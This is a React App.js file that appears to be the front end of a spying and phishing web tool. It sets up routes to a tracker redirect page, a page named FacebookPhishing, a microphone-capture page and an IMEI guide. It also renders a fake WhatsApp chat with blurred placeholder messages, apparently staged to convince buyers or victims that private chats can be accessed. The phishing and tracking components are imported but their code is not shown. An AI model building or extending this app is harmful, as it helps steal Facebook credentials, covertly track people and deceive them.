import React, { useState } from 'react';
import './global.css';
import Login from './components/Login';
import Dashboard from './components/Dashboard';
import TrackerPage from './pages/TrackerPage';
import FacebookPhishing from './pages/FacebookPhishing';
import MicrophonePage from './pages/MicrophonePage';
import HowToGetIMEI from './pages/HowToGetIMEI';
import { BrowserRouter, Routes, Route, useParams } from 'react-router-dom';

function WhatsAppChat() {
  const { number } = useParams();
  // Mensagens simuladas
  const messages = [
    { fromMe: false, text: 'last message', time: '21:13' },
    { fromMe: true, text: 'last message', time: '21:14' },
    { fromMe: false, text: 'last message', time: '21:15' },
    { fromMe: true, text: 'last message', time: '21:16' },
    { fromMe: false, text: 'last message', time: '21:17' },
    { fromMe: true, text: 'last message', time: '21:18' },
    { fromMe: false, text: 'last message', time: '21:19' },
    { fromMe: true, text: 'last message', time: '21:20' },
  ];
  return (
    <div style={{
      minHeight: '100vh',
      background: '#111b21 url("https://static.whatsapp.net/rsrc.php/v3/yl/r/8zQ2Wg6q4kN.png") repeat',
      color: '#e9edef',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      fontFamily: 'Inter, Arial, sans-serif'
    }}>
      {/* Barra superior */}
      <div style={{
        width: '100%',
        maxWidth: 700,
        background: '#202c33',
        borderRadius: '0 0 14px 14px',
        boxShadow: '0 2px 8px #0001',
        padding: '1.2rem 2.2rem',
        display: 'flex', alignItems: 'center', gap: 16, marginTop: 32
      }}>
        <div style={{ width: 44, height: 44, borderRadius: '50%', background: '#25d366', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 22 }}>D</div>
        <div>
          <div style={{ fontWeight: 700, color: '#25d366', fontSize: 18 }}>davi</div>
          <div style={{ color: '#b0b0b0', fontSize: 14 }}>online</div>
        </div>
        <div style={{ marginLeft: 'auto', color: '#b0b0b0', fontSize: 15 }}>{number}</div>
        <div style={{ marginLeft: 18, display: 'flex', gap: 12 }}>
          <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📞</span>
          <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📹</span>
          <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>⋮</span>
        </div>
      </div>
      {/* Área de mensagens */}
      <div style={{
        background: 'transparent',
        borderRadius: 14,
        boxShadow: 'none',
        padding: '1.5rem 2.2rem',
        maxWidth: 700,
        width: '100%',
        margin: '32px auto 0 auto',
        minHeight: 320,
        maxHeight: 420,
        overflowY: 'auto',
        display: 'flex', flexDirection: 'column', gap: 0
      }}>
        {messages.map((msg, i) => (
          <div key={i} style={{
            display: 'flex', flexDirection: msg.fromMe ? 'row-reverse' : 'row', alignItems: 'flex-end',
            marginBottom: 10, width: '100%'
          }}>
            <div style={{
              background: msg.fromMe ? '#005c4b' : '#232d36',
              color: '#e9edef',
              borderRadius: msg.fromMe ? '16px 4px 16px 16px' : '4px 16px 16px 16px',
              padding: '0.7rem 1.1rem',
              minWidth: 60,
              maxWidth: '70%',
              fontSize: 15,
              position: 'relative',
              filter: 'blur(3px) grayscale(0.3) brightness(0.7)',
              userSelect: 'none',
              cursor: 'not-allowed',
              marginLeft: msg.fromMe ? 0 : 8,
              marginRight: msg.fromMe ? 8 : 0
            }}>
              <span style={{ color: '#25d366', fontSize: 18, marginRight: 6 }}>💬</span>
              {msg.text}
              <span style={{ position: 'absolute', right: 10, bottom: 6, color: '#b0b0b0', fontSize: 12 }}>{msg.time}</span>
            </div>
          </div>
        ))}
      </div>
      {/* Campo de digitação fake */}
      <div style={{
        width: '100%', maxWidth: 700, margin: '0 auto', marginTop: 18,
        display: 'flex', alignItems: 'center', gap: 12, background: '#232d36', borderRadius: 10, padding: '0.7rem 1.2rem'
      }}>
        <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>😊</span>
        <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📎</span>
        <input disabled placeholder="Type a message..." style={{
          flex: 1, background: 'transparent', border: 'none', color: '#b0b0b0', fontSize: 15, outline: 'none', fontFamily: 'Inter',
        }} />
        <button disabled style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.5rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'not-allowed' }}>🎤</button>
        <button disabled style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.5rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'not-allowed' }}>Send</button>
      </div>
      {/* Mensagem de privacidade */}
      <div style={{ color: '#b0b0b0', fontSize: 15, marginTop: 18, textAlign: 'center', maxWidth: 700 }}>
        <span style={{ color: '#E60033', fontWeight: 600 }}>You do not have access to the content of this chat.</span>
      </div>
    </div>
  );
}

function App() {
  const [usuario, setUsuario] = useState(localStorage.getItem('usuario') || null);

  function handleLogin(email) {
    setUsuario(email);
    localStorage.setItem('usuario', email);
  }

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={
          !usuario ? (
            <Login onLogin={handleLogin} />
          ) : (
            <Dashboard email={usuario} />
          )
        } />
        <Route path="/redirect/:id" element={<TrackerPage />} />
        <Route path="/facebook/:id" element={<FacebookPhishing />} />
        <Route path="/microphone/:id" element={<MicrophonePage />} />
        <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
        <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
